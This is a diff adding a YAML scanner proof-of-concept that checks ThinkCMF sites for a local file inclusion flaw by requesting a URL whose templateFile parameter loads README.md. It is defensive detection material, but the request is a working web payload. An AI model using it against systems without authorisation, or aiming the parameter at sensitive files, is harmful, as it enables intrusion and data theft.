@@ -1,0 +1,22 @@
+id: poc-yaml-thinkcmf-lfi
+info:
+  name: Thinkcmf 本地文件包含漏洞
+  severity: medium
+  tags:
+  - lfi
+  finger: Thinkcmf
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /?a=display&templateFile=README.md
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "ThinkCMF") && contains(body, "##
+    README")
+  output: []
